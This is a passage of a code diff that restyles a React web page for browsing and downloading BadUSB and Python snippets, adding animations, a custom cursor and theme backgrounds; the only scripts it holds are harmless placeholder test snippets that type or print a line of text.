@@ -1,26 +1,21 @@
-<html><head><base href="https://advanced-badusb-interface.com/">
+<html><head><base href="https://advanced-vpn-interface.com/">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ZrK BadUSB Learning Hub</title>
+    <title>Python and BadUSB Code Database</title>
     <script src="https://unpkg.com/react@17/umd/react.production.min.js"></script>
     <script src="https://unpkg.com/react-dom@17/umd/react-dom.production.min.js"></script>
     <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <script src="https://unpkg.com/react-transition-group@4.4.2/dist/react-transition-group.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
 
         :root {
-            --primary-color: #4caf50;
-            --secondary-color: #2196f3;
-            --accent-color: #ff9800;
+            --primary-color: #FF8C00;
+            --secondary-color: #FFA500;
+            --accent-color: #FFD700;
             --text-color: #ffffff;
             --background-color: #1a1a2e;
-            --sidebar-width: 80px;
-            --transition-speed: 0.3s;
-            --font-size: 16px;
-            --animation-speed: 0.3s;
-            --gradient-color-1: #4caf50;
-            --gradient-color-2: #2196f3;
         }
 
         body, html {
@@ -28,9 +23,39 @@
             padding: 0;
             font-family: 'Roboto', sans-serif;
             height: 100vh;
-            background-color: var(--background-color);
+            overflow: hidden;
+            background-image: url('https://i.ibb.co/x5BFf78/unflipperzertitled.png'), linear-gradient(-45deg, #1a1a2e, #16213e, #0f3460, #1a1a2e);
+            background-size: cover, 400% 400%;
+            background-position: center;
+            background-repeat: no-repeat, repeat;
             color: var(--text-color);
-            font-size: var(--font-size);
+            cursor: none;
+            transition: all 0.5s ease;
+        }
+
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        @keyframes fadeInScale {
+            from {
+                opacity: 0;
+                transform: scale(0.9) translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
+        }
+
+        .fade-enter {
+            animation: fadeInScale 0.5s forwards;
+        }
+
+        .fade-exit {
+            animation: fadeInScale 0.5s forwards reverse;
         }
 
         #root {
@@ -43,15 +68,14 @@
         }
 
         .sidebar {
-            width: var(--sidebar-width);
-            background: linear-gradient(135deg, var(--gradient-color-1), var(--gradient-color-2));
+            width: 80px;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
             display: flex;
             flex-direction: column;
             align-items: center;
             padding: 20px 0;
             position: relative;
             z-index: 1000;
-            transition: width var(--animation-speed) ease;
         }
 
         .sidebar-icons {
@@ -65,12 +89,22 @@
             font-size: 24px;
             margin-bottom: 30px;
             color: var(--text-color);
-            cursor: pointer;
-            transition: color 0.3s ease;
+            cursor: none;
+            transition: transform 0.3s cubic-bezier(0.68, -0.55, 0.27, 1.55), color 0.3s ease;
         }
 
         .sidebar-icons .icon:hover {
-            color: var(--accent-color);
+            transform: translateY(-5px) scale(1.1);
+        }
+
+        .sidebar-icons .icon.active {
+            animation: iconPulse 1.5s infinite;
+        }
+
+        @keyframes iconPulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
         }
 
         .sidebar-icons .bottom-icons {
@@ -89,1836 +123,704 @@
             position: relative;
         }
 
-        .badusb-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
-            gap: 20px;
+        .code-database, .home-content, .search-content, .profile-content, .settings-content {
+            flex: 1;
+            background: rgba(26, 26, 46, 0.8);
+            border-radius: 15px;
             padding: 20px;
             overflow-y: auto;
-            max-height: calc(100vh - 100px);
         }
 
-        .badusb-card {
-            background-color: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            padding: 20px;
+        .code-snippet, .news-item, .random-code {
+            border: 1px solid rgb(255, 255, 255, 0.2);
+            border-radius: 5px;
+            padding: 10px;
+            margin-bottom: 10px;
+            background-color: rgba(255, 255, 255, 0.05);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .code-snippet:hover, .news-item:hover, .random-code:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .code-snippet h3 {
+            margin: 0;
+            color: var(--accent-color);
+        }
+
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .copy-button, .download-button {
+            padding: 5px 10px;
+            background-color: var(--accent-color);
+            color: var(--text-color);
+            border: none;
+            border-radius: 5px;
+            cursor: none;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+        }
+
+        .copy-button:hover, .download-button:hover {
+            transform: scale(1.05);
+        }
+
+        .copy-button:active, .download-button:active {
+            transform: scale(0.95);
+        }
+
+        .code-list {
             display: flex;
             flex-direction: column;
-            justify-content: space-between;
-            position: relative;
-            overflow: hidden;
         }
 
-        .badusb-card h3 {
-            margin: 0 0 10px 0;
-        }
-
-        .badusb-card .card-buttons {
-            display: flex;
-            justify-content: space-between;
-        }
-
-        .badusb-card button {
-            flex: 1;
-            margin: 0 5px;
+        button.copy-button {
+            padding: 5px 10px;
             background-color: var(--accent-color);
             color: var(--text-color);
             border: none;
-            padding: 10px;
             border-radius: 5px;
             cursor: pointer;
-            transition: background-color 0.3s ease;
+            transition: background-color 0.3s ease, transform 0.3s ease;
         }
 
-        .badusb-card button:hover {
-            background-color: #fb8c00;
+        button.copy-button:hover {
+            transform: scale(1.05);
         }
 
-        .content-section {
-            display: none;
+        button.copy-button:active {
+            transform: scale(0.95);
         }
 
-        .content-section.active {
-            display: block;
-        }
-
-        .settings-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            gap: 20px;
-            padding: 20px;
-        }
-
-        .settings-card {
-            background-color: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            padding: 20px;
-        }
-
-        .settings-card h3 {
-            margin-top: 0;
-        }
-
-        .settings-card label {
-            display: block;
-            margin-bottom: 10px;
-        }
-
-        .settings-card input[type="checkbox"],
-        .settings-card input[type="range"],
-        .settings-card input[type="number"],
-        .settings-card input[type="color"],
-        .settings-card input[type="text"],
-        .settings-card input[type="file"] {
-            margin-right: 10px;
+        .search-bar {
             width: 100%;
-            margin-top: 5px;
-        }
-
-        .settings-card button {
-            background-color: var(--accent-color);
-            color: var(--text-color);
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-
-        .settings-card button:hover {
-            background-color: #fb8c00;
-        }
-
-        .profile-section {
-            padding: 20px;
-        }
-
-        .profile-info {
-            background-color: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-
-        .profile-actions button {
-            background-color: var(--accent-color);
-            color: var(--text-color);
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-            margin-right: 10px;
-        }
-
-        .profile-actions button:hover {
-            background-color: #fb8c00;
-        }
-
-        .documentation-content {
-            max-width: 800px;
-            margin: 0 auto;
-            line-height: 1.6;
-        }
-
-        .documentation-content h3 {
-            margin-top: 20px;
-            color: var(--accent-color);
-        }
-
-        .documentation-content ol {
-            padding-left: 20px;
-        }
-
-        .documentation-content li {
-            margin-bottom: 10px;
-        }
-
-        .search-and-filter {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 20px;
-        }
-
-        .search-and-filter input,
-        .search-and-filter select {
             padding: 10px;
+            margin-bottom: 20px;
             border-radius: 5px;
             border: none;
             background-color: rgba(255, 255, 255, 0.1);
             color: var(--text-color);
-        }
-
-        .badusb-card .category {
-            font-size: 0.8em;
-            color: var(--accent-color);
-            margin-bottom: 10px;
         }
 
         .home-content {
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            height: 100%;
+            text-align: center;
+            overflow-y: auto;
+            padding: 40px;
+        }
+
+        .home-content h1 {
+            font-size: 3em;
+            margin-bottom: 10px;
+            color: var(--accent-color);
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0px); }
+        }
+
+        .home-content p {
+            font-size: 1.2em;
+            margin-bottom: 40px;
+            max-width: 600px;
+            overflow: hidden;
+            border-right: .15em solid var(--accent-color);
+            white-space: nowrap;
+            margin: 0 auto;
+            letter-spacing: .15em;
+            animation: typing 3.5s steps(40, end), blink-caret .75s step-end infinite;
+        }
+
+        @keyframes typing {
+            from { width: 0 }
+            to { width: 100% }
+        }
+
+        @keyframes blink-caret {
+            from, to { border-color: transparent }
+            50% { border-color: var(--accent-color); }
+        }
+
+        .home-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 20px;
-        }
-
-        .greeting, .summary, .featured-script, .quick-actions, .news-ticker {
-            background-color: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-
-        .greeting h3 {
-            margin-top: 0;
-            color: var(--accent-color);
-        }
-
-        .quick-actions button {
-            background-color: var(--accent-color);
-            color: var(--text-color);
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            margin-right: 10px;
-            transition: background-color 0.3s ease;
-        }
-
-        .quick-actions button:hover {
-            background-color: #fb8c00;
-        }
-
-        .news-ticker marquee {
-            background-color: rgba(255, 255, 255, 0.05);
-            padding: 10px;
-            border-radius: 5px;
-        }
-
-        @media (max-width: 768px) {
-            .app-container {
-                flex-direction: column;
-            }
-
-            .sidebar {
-                width: 100%;
-                height: auto;
-                flex-direction: row;
-                justify-content: space-around;
-                padding: 10px 0;
-            }
-
-            .sidebar-icons {
-                flex-direction: row;
-            }
-
-            .sidebar-icons .icon {
-                margin: 0 10px;
-            }
-
-            .sidebar-icons .bottom-icons {
-                position: static;
-                flex-direction: row;
-            }
-
-            .main-content {
-                padding: 10px;
-            }
-
-            .badusb-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .home-content {
-                grid-template-columns: 1fr;
-            }
-        }
-
-        .script-content {
-            max-height: 200px;
-            overflow-y: auto;
-            margin-bottom: 10px;
-        }
-
-        .script-content pre {
-            white-space: pre-wrap;
-            word-wrap: break-word;
-        }
-
-        .dark-mode {
-            --background-color: #121212;
-            --text-color: #ffffff;
-        }
-
-        .plugin-form {
-            margin-bottom: 20px;
-        }
-
-        .plugin-form textarea {
+            gap: 40px;
             width: 100%;
-            height: 100px;
-            margin-bottom: 10px;
-            padding: 10px;
-            border-radius: 5px;
-            border: 1px solid var(--accent-color);
-            background-color: rgba(255, 255, 255, 0.1);
-            color: var(--text-color);
+            max-width: 1200px;
         }
 
-        .plugin-form button,
-        .plugin-item button {
-            background-color: var(--accent-color);
-            color: var(--text-color);
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
+        .news-section, .featured-scripts {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(10px);
         }
 
-        .plugin-form button:hover,
-        .plugin-item button:hover {
-            background-color: #fb8c00;
-        }
-
-        .plugin-list {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
-            gap: 20px;
-        }
-
-        .plugin-item {
-            background-color: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            padding: 20px;
-            position: relative;
-        }
-
-        .plugin-item button {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-        }
-
-        .history-section {
-            padding: 20px;
-        }
-
-        .history-list {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
-        .history-item {
-            display: flex;
-            align-items: center;
-            background-color: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            padding: 15px;
-            transition: background-color 0.3s ease;
-        }
-
-        .history-item:hover {
-            background-color: rgba(255, 255, 255, 0.2);
-        }
-
-        .history-item i {
-            font-size: 24px;
-            margin-right: 15px;
-            color: var(--accent-color);
-        }
-
-        .history-details {
-            display: flex;
-            flex-direction: column;
-        }
-
-        .script-name {
-            font-weight: bold;
-            margin-bottom: 5px;
-        }
-
-        .download-date {
-            font-size: 0.9em;
-            color: rgba(255, 255, 255, 0.7);
-        }
-
-        @keyframes downloadProgress {
-          0% { width: 0%; }
-          100% { width: 100%; }
-        }
-
-        .download-progress {
-          position: absolute;
-          bottom: 0;
-          left: 0;
-          height: 4px;
-          background-color: var(--accent-color);
-          animation: downloadProgress 1s linear;
-        }
-
-        .badusb-card button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-
-        .news-content {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-            max-height: 80vh;
-            overflow-y: auto;
-            padding-right: 20px;
+        .news-section h2, .featured-scripts h2 {
+            font-size: 2em;
+            margin-bottom: 20px;
+            color: var(--primary-color);
         }
 
         .news-item {
-            background-color: rgba(255, 255, 255, 0.1);
+            margin-bottom: 25px;
+            text-align: left;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.05);
             border-radius: 10px;
-            padding: 20px;
-            transition: all 0.3s ease;
-            animation: fadeInUp 0.5s ease-out;
-            animation-fill-mode: both;
+            transition: transform 0.3s ease;
         }
 
         .news-item:hover {
-            background-color: rgba(255, 255, 255, 0.2);
             transform: translateY(-5px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
         }
 
         .news-item h3 {
-            margin-top: 0;
             color: var(--accent-color);
-        }
-
-        .news-date {
-            font-size: 0.8em;
-            color: var(--text-color);
-            opacity: 0.7;
-        }
-
-        .news-category {
-            display: inline-block;
-            background-color: var(--accent-color);
-            color: var(--background-color);
-            padding: 5px 10px;
-            border-radius: 15px;
-            font-size: 0.8em;
             margin-bottom: 10px;
+            font-size: 1.4em;
         }
 
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+        .news-item p {
+            font-size: 1em;
+            line-height: 1.6;
         }
 
-        .news-item:nth-child(1) { animation-delay: 0.1s; }
-        .news-item:nth-child(2) { animation-delay: 0.2s; }
-        .news-item:nth-child(3) { animation-delay: 0.3s; }
-        .news-item:nth-child(4) { animation-delay: 0.4s; }
-        .news-item:nth-child(5) { animation-delay: 0.5s; }
-        .news-item:nth-child(6) { animation-delay: 0.6s; }
-        .news-item:nth-child(7) { animation-delay: 0.7s; }
+        .random-code {
+            margin-bottom: 30px;
+        }
+
+        .random-code h3 {
+            font-size: 1.4em;
+            margin-bottom: 15px;
+            color: var(--secondary-color);
+        }
+
+        .random-code pre {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            overflow-x: auto;
+            font-size: 0.9em;
+            line-height: 1.5;
+        }
+
+        /* Hide default scrollbars */
+        ::-webkit-scrollbar {
+            display: none;
+        }
+
+        /* Custom scrollbar styles */
+        .custom-scrollbar {
+            scrollbar-width: thin;
+            scrollbar-color: var(--accent-color) transparent;
+        }
+
+        .custom-scrollbar::-webkit-scrollbar {
+            width: 8px;
+            display: block;
+        }
+
+        .custom-scrollbar::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        .custom-scrollbar::-webkit-scrollbar-thumb {
+            background-color: var(--accent-color);
+            border-radius: 4px;
+        }
+
+        /* Add transition for content */
+        .main-content > div {
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+
+        .main-content > div.fade-enter {
+            opacity: 0;
+            transform: translateY(20px);
+        }
+
+        .main-content > div.fade-enter-active {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .main-content > div.fade-exit {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .main-content > div.fade-exit-active {
+            opacity: 0;
+            transform: translateY(-20px);
+        }
+
+        .custom-cursor {
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--accent-color);
+            border-radius: 50%;
+            position: fixed;
+            pointer-events: none;
+            z-index: 9999;
+            transition: transform 0.1s ease, width 0.1s ease, height 0.1s ease;
+            mix-blend-mode: difference;
+        }
+
+        .cursor-trail {
+            width: 10px;
+            height: 10px;
+            background-color: var(--accent-color);
+            border-radius: 50%;
+            position: fixed;
+            pointer-events: none;
+            z-index: 9998;
+            opacity: 0.5;
+            transition: opacity 0.5s ease, transform 0.1s ease;
+            mix-blend-mode: difference;
+        }
+
+        button, a, input, .icon {
+            cursor: none;
+        }
+
+        button:hover, a:hover, .icon:hover {
+            cursor: none;
+        }
+
+        .theme-settings {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+
+        .theme-buttons {
+            display: flex;
+            gap: 20px;
+            margin-top: 15px;
+        }
+
+        .theme-button {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid transparent;
+            border-radius: 10px;
+            padding: 15px;
+            transition: all 0.3s ease;
+            width: 200px;
+        }
+
+        .theme-button:hover {
+            transform: translateY(-5px);
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .theme-button.active {
+            border-color: var(--accent-color);
+            box-shadow: 0 0 15px var(--accent-color);
+        }
+
+        .theme-preview {
+            width: 150px;
+            height: 90px;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            background-size: cover;
+            background-position: center;
+        }
+
+        .cosmic-flipper-theme {
+            background-image: url('https://i.ibb.co/x5BFf78/unflipperzertitled.png');
+        }
+
+        .retro-hack-theme {
+            background-image: url('https://i.ibb.co/k49NRgG/background2.png');
+        }
+
+        .the-street-theme {
+            background-image: url('https://i.ibb.co/GJq56L9/background3.png');
+        }
+
+        .theme-button span {
+            font-size: 16px;
+            font-weight: bold;
+            color: var(--text-color);
+            margin-bottom: 5px;
+        }
+
+        .theme-button p {
+            font-size: 14px;
+            color: var(--text-color);
+            text-align: center;
+            margin: 0;
+        }
+        
     </style>
 </head>
 <body>
     <div id="root"></div>
 
     <script type="text/babel">
-        const { useState, useEffect } = React;
-        const AppName = "ZrK BadUSB Learning Hub";
+        const { useState, useRef, useEffect } = React;
+        const { CSSTransition, SwitchTransition } = ReactTransitionGroup;
 
-        const BadUSBCard = ({ scriptName, scriptContent, category, setDownloadHistory }) => {
-            const [expanded, setExpanded] = useState(false);
-            const [downloading, setDownloading] = useState(false);
+        const generateTestCode = (type, index) => {
+            if (type === 'badusb') {
+                return `REM BadUSB Test Script ${index}\nDELAY 1000\nSTRING This is a test BadUSB script\nENTER`;
+            } else {
+                return `# Python Test Script ${index}\nprint("This is a test Python script")\nprint(f"Script number: ${index}")`;
+            }
+        };
 
-            const handleCopy = () => {
-                navigator.clipboard.writeText(scriptContent)
-                    .then(() => alert(`Copied ${scriptName} to clipboard`))
-                    .catch(err => console.error('Failed to copy: ', err));
+        const generateCodeSnippets = () => {
+            const snippets = {
+                badusb: [],
+                python: []
             };
+            for (let i = 1; i <= 60; i++) {
+                snippets.badusb.push({
+                    type: 'badusb',
+                    code: generateTestCode('badusb', i),
+                    name: `BadUSB Test ${i}`
+                });
+            }
+            for (let i = 1; i <= 20; i++) {
+                snippets.python.push({
+                    type: 'python',
+                    code: generateTestCode('python', i),
+                    name: `Python Test ${i}`
+                });
+            }
+            return snippets;
+        };
 
-            const handleDownload = () => {
-                if (window.confirm(`Are you sure you want to download "${scriptName}"? This script may be potentially harmful.`)) {
-                    setDownloading(true);
-                    setTimeout(() => {
-                        const newDownload = { scriptName, date: new Date().toLocaleString() };
-                        setDownloadHistory(prevHistory => [...prevHistory, newDownload]);
-                        
-                        const blob = new Blob([scriptContent], { type: 'text/plain' });
-                        const url = URL.createObjectURL(blob);
-                        const a = document.createElement('a');
-                        a.href = url;
-                        a.download = `${scriptName}.txt`;
-                        document.body.appendChild(a);
-                        a.click();
-                        document.body.removeChild(a);
-                        URL.revokeObjectURL(url);
-                        setDownloading(false);
-                    }, 1000); // Simulate download for 1 second
-                }
+        const NewsItem = ({ title, summary }) => (
+          <div className="news-item">
+            <h3>{title}</h3>
+            <p>{summary}</p>
+          </div>
+        );
+
+        const RandomCode = ({ code, language }) => (
+          <div className="random-code">
+            <h3>Random {language} Snippet</h3>
+            <pre><code>{code}</code></pre>
+          </div>
+        );
+
+        const CodeSnippet = ({ snippet, index, copyToClipboard, copiedIndex }) => {
+            const downloadFile = () => {
+                const element = document.createElement("a");
+                const file = new Blob([snippet.code], {type: 'text/plain'});
+                element.href = URL.createObjectURL(file);
+                element.download = `${snippet.name}.${snippet.type === 'python' ? 'py' : 'txt'}`;
+                document.body.appendChild(element);
+                element.click();
+                document.body.removeChild(element);
             };
 
             return (
-                <div className="badusb-card">
-                    <h3>{scriptName}</h3>
-                    <p className="category">{category}</p>
-                    <div className="script-content">
-                        <pre>{expanded ? scriptContent : `${scriptContent.slice(0, 100)}...`}</pre>
-                        <button onClick={() => setExpanded(!expanded)}>
-                            {expanded ? 'Show Less' : 'Show More'}
+                <div className="code-snippet">
+                    <h3>{snippet.name}</h3>
+                    <pre><code>{snippet.code}</code></pre>
+                    <div className="button-group">
+                        <button 
+                            className="copy-button" 
+                            onClick={() => copyToClipboard(snippet.code, index)}
+                        >
+                            {copiedIndex === index ? 'Copied!' : 'Copy Code'}
+                        </button>
+                        <button 
+                            className="download-button" 
+                            onClick={downloadFile}
+                        >
+                            Download {snippet.type === 'python' ? '.py' : '.txt'}
                         </button>
                     </div>
-                    <div className="card-buttons">
-                        <button onClick={handleCopy}>Copy</button>
-                        <button onClick={handleDownload} disabled={downloading}>
-                            {downloading ? 'Downloading...' : 'Download'}
-                        </button>
-                    </div>
-                    {downloading && <div className="download-progress"></div>}
                 </div>
             );
         };
 
-        const HistorySection = ({ downloadHistory }) => {
-            return (
-                <div className="history-section">
-                    <h2>Download History</h2>
-                    <div className="history-list">
-                        {downloadHistory.map((download, index) => (
-                            <div key={index} className="history-item">
-                                <i className="fas fa-file-download"></i>
-                                <div className="history-details">
-                                    <span className="script-name">{download.scriptName}</span>
-                                    <span className="download-date">{download.date}</span>
-                                </div>
-                            </div>
-                        ))}
-                    </div>
-                </div>
-            );
-        };
-
-        const SettingsSection = () => {
-            const [settings, setSettings] = useState(() => {
-                const savedSettings = localStorage.getItem('zrkBadUSBSettings');
-                return savedSettings ? JSON.parse(savedSettings) : {
-                    darkMode: false,
-                    showNotifications: true,
-                    twoFactorAuth: false,
-                    autoLogout: false,
-                    animationSpeed: 50,
-                    fontSize: 16,
-                    accentColor: '#ff9800',
-                    sidebarWidth: 80,
-                    gradientColor1: '#4caf50',
-                    gradientColor2: '#2196f3',
-                    userName: 'User',
-                    customBackground: '',
-                    isCustomBackgroundGif: false,
-                };
-            });
-
-            const [customBackground, setCustomBackground] = useState(settings.customBackground || '');
-            const [isCustomBackgroundGif, setIsCustomBackgroundGif] = useState(settings.isCustomBackgroundGif || false);
+        const CustomCursor = () => {
+            const cursorRef = useRef(null);
+            const cursorTrailRef = useRef(null);
 
             useEffect(() => {
-                localStorage.setItem('zrkBadUSBSettings', JSON.stringify(settings));
-                applySettings(settings);
-            }, [settings]);
-
-            const handleChange = (setting, value) => {
-                setSettings(prev => ({ ...prev, [setting]: value }));
-            };
-
-            const resetSettings = () => {
-                const defaultSettings = {
-                    darkMode: false,
-                    showNotifications: true,
-                    twoFactorAuth: false,
-                    autoLogout: false,
-                    animationSpeed: 50,
-                    fontSize: 16,
-                    accentColor: '#ff9800',
-                    sidebarWidth: 80,
-                    gradientColor1: '#4caf50',
-                    gradientColor2: '#2196f3',
-                    userName: 'User',
-                    customBackground: '',
-                    isCustomBackgroundGif: false,
+                const moveCursor = (e) => {
+                    const { clientX, clientY } = e;
+                    cursorRef.current.style.transform = `translate(${clientX - 10}px, ${clientY - 10}px) scale(1)`;
+                    setTimeout(() => {
+                        cursorTrailRef.current.style.transform = `translate(${clientX - 5}px, ${clientY - 5}px)`;
+                    }, 50);
                 };
-                setSettings(defaultSettings);
-            };
 
-            const handleBackgroundChange = (e) => {
-                const file = e.target.files[0];
-                if (file) {
-                    const reader = new FileReader();
-                    reader.onloadend = () => {
-                        setCustomBackground(reader.result);
-                        setIsCustomBackgroundGif(file.type === 'image/gif');
-                        handleChange('customBackground', reader.result);
-                        handleChange('isCustomBackgroundGif', file.type === 'image/gif');
-                    };
-                    reader.readAsDataURL(file);
-                }
-            };
+                const growCursor = () => {
+                    cursorRef.current.style.transform += ' scale(1.5)';
+                };
 
-            const removeCustomBackground = () => {
-                setCustomBackground('');
-                setIsCustomBackgroundGif(false);
-                handleChange('customBackground', '');
-                handleChange('isCustomBackgroundGif', false);
-            };
+                const shrinkCursor = () => {
+                    cursorRef.current.style.transform = cursorRef.current.style.transform.replace(' scale(1.5)', '');
+                };
 
-            const applyTheme = (themeIndex) => {
-                if (themeIndex !== "") {
-                    const theme = themes[themeIndex];
-                    setSettings(prevSettings => ({
-                        ...prevSettings,
-                        darkMode: theme.darkMode,
-                        accentColor: theme.accentColor,
-                        gradientColor1: theme.gradientColor1,
-                        gradientColor2: theme.gradientColor2,
-                    }));
-                }
-            };
+                document.addEventListener('mousemove', moveCursor);
+                document.addEventListener('mousedown', growCursor);
+                document.addEventListener('mouseup', shrinkCursor);
 
-            const themes = [
-                {
-                    name: "Default",
-                    darkMode: false,
-                    accentColor: '#ff9800',
-                    gradientColor1: '#4caf50',
-                    gradientColor2: '#2196f3',
-                },
-                {
-                    name: "Dark Mode",
-                    darkMode: true,
-                    accentColor: '#7e57c2',
-                    gradientColor1: '#303f9f',
-                    gradientColor2: '#1976d2',
-                },
-                {
-                    name: "Neon",
-                    darkMode: true,
-                    accentColor: '#00ffff',
-                    gradientColor1: '#ff00ff',
-                    gradientColor2: '#00ff00',
-                },
-                {
-                    name: "Earthy",
-                    darkMode: false,
-                    accentColor: '#795548',
-                    gradientColor1: '#8d6e63',
-                    gradientColor2: '#a1887f',
-                },
-                {
-                    name: "Ocean",
-                    darkMode: true,
-                    accentColor: '#00bcd4',
-                    gradientColor1: '#006064',
-                    gradientColor2: '#0097a7',
-                },
-                {
-                    name: "Sunset",
-                    darkMode: false,
-                    accentColor: '#ff5722',
-                    gradientColor1: '#ff9800',
-                    gradientColor2: '#ff5722',
-                },
-                {
-                    name: "Forest",
-                    darkMode: false,
-                    accentColor: '#4caf50',
-                    gradientColor1: '#1b5e20',
-                    gradientColor2: '#43a047',
-                },
-                {
-                    name: "Cyberpunk",
-                    darkMode: true,
-                    accentColor: '#ffd600',
-                    gradientColor1: '#d500f9',
-                    gradientColor2: '#651fff',
-                },
-                {
-                    name: "Pastel",
-                    darkMode: false,
-                    accentColor: '#f48fb1',
-                    gradientColor1: '#b2ebf2',
-                    gradientColor2: '#fff9c4',
-                },
-                {
-                    name: "Monochrome",
-                    darkMode: true,
-                    accentColor: '#ffffff',
-                    gradientColor1: '#212121',
-                    gradientColor2: '#757575',
-                },
-                {
-                    name: "Retro",
-                    darkMode: false,
-                    accentColor: '#ff4081',
-                    gradientColor1: '#ffeb3b',
-                    gradientColor2: '#76ff03',
-                },
-                {
-                    name: "Space",
-                    darkMode: true,
-                    accentColor: '#e1bee7',
-                    gradientColor1: '#311b92',
-                    gradientColor2: '#4a148c',
-                },
-                {
-                    name: "Autumn",
-                    darkMode: false,
-                    accentColor: '#ff6f00',
-                    gradientColor1: '#bf360c',
-                    gradientColor2: '#e65100',
-                },
-                {
-                    name: "Ice",
-                    darkMode: true,
-                    accentColor: '#80deea',
-                    gradientColor1: '#01579b',
-                    gradientColor2: '#0288d1',
-                },
-                {
-                    name: "Sunset",
-                    darkMode: false,
-                    accentColor: '#ff9e80',
-                    gradientColor1: '#ff6e40',
-                    gradientColor2: '#ff3d00',
-                },
-                {
-                    name: "Midnight",
-                    darkMode: true,
-                    accentColor: '#b388ff',
-                    gradientColor1: '#1a237e',
-                    gradientColor2: '#283593',
-                },
-                {
-                    name: "Forest",
-                    darkMode: false,
-                    accentColor: '#69f0ae',
-                    gradientColor1: '#1b5e20',
-                    gradientColor2: '#2e7d32',
-                },
-                {
-                    name: "Lavender",
-                    darkMode: false,
-                    accentColor: '#ea80fc',
-                    gradientColor1: '#9c27b0',
-                    gradientColor2: '#7b1fa2',
-                },
-                {
-                    name: "Cyberpunk",
-                    darkMode: true,
-                    accentColor: '#ffff00',
-                    gradientColor1: '#ff00ff',
-                    gradientColor2: '#00ffff',
-                },
-                {
-                    name: "Sepia",
-                    darkMode: false,
-                    accentColor: '#d7ccc8',
-                    gradientColor1: '#795548',
-                    gradientColor2: '#5d4037',
-                },
-                {
-                    name: "Neon",
-                    darkMode: true,
-                    accentColor: '#1de9b6',
-                    gradientColor1: '#b71c1c',
-                    gradientColor2: '#880e4f',
-                },
-                {
-                    name: "Pastel",
-                    darkMode: false,
-                    accentColor: '#ffccbc',
-                    gradientColor1: '#ffcc80',
-                    gradientColor2: '#fff59d',
-                },
-                {
-                    name: "Monochrome",
-                    darkMode: true,
-                    accentColor: '#ffffff',
-                    gradientColor1: '#212121',
-                    gradientColor2: '#424242',
-                },
-                {
-                    name: "Candy",
-                    darkMode: false,
-                    accentColor: '#ff4081',
-                    gradientColor1: '#f50057',
-                    gradientColor2: '#ff80ab',
-                },
-                {
-                    name: "Steampunk",
-                    darkMode: true,
-                    accentColor: '#ffd54f',
-                    gradientColor1: '#3e2723',
-                    gradientColor2: '#4e342e',
-                },
-                {
-                    name: "Tropical",
-                    darkMode: false,
-                    accentColor: '#ffd180',
